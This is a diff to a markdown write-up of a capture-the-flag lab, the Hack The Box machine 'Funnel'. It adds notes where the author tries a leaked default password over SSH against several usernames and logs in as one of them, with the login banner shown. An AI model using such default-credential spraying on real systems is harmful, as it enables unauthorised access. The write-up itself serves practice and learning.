@@ -1,3 +1,10 @@
+- [[#nmap|nmap]]
+- [[#FTP|FTP]]
+- [[#Deep dive retrieved files from enumeration|Deep dive retrieved files from enumeration]]
+			- [[#PDF contents|PDF contents]]
+			- [[#Email Content|Email Content]]
+- [[#SSH Enumeration|SSH Enumeration]]
+
 # Funnel Enumeration
 
 ## nmap
@@ -100,7 +107,7 @@ Key findings:
 - FTP allowed anonymous login using `anonymous` username. Password is blank
 - The FTP had a directory called `mail_backup` and it contained two files.
 
-## Deep dive retrieved files from [[01 - Enumeration#FTP]]
+## Deep dive retrieved files from enumeration
 
 ##### PDF contents
 
@@ -132,3 +139,49 @@ The welcome email was a copy of email which seems to be an onboarding email to n
 - christine
 
 ## SSH Enumeration
+
+Assuming that one of them forgot to change their password, I'm trying to access each user's machine by using the default ==funnel123#!#==  
+
+```bash
+$ ssh christine@funnel.htb
+christine@funnel.htb\'s password: 
+Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-135-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Wed 12 Jun 2024 12:30:20 AM UTC
+
+  System load:              0.0
+  Usage of /:               61.4% of 4.78GB
+  Memory usage:             12%
+  Swap usage:               0%
+  Processes:                159
+  Users logged in:          0
+  IPv4 address for docker0: 172.17.0.1
+  IPv4 address for ens160:  10.129.228.195
+  IPv6 address for ens160:  dead:beef::250:56ff:feb0:e80a
+
+ * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
+   just raised the bar for easy, resilient and secure K8s cluster deployment.
+
+   https://ubuntu.com/engage/secure-kubernetes-at-the-edge
+
+0 updates can be applied immediately.
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+christine@funnel:~$ 
+```
+
+| Name      | Success ? |
+| --------- | --------- |
+| optimus   | F         |
+| albert    | F         |
+| andreas   | F         |
+| christine | T         |
+
+Turns out it was `christine` who forgot to change her password.
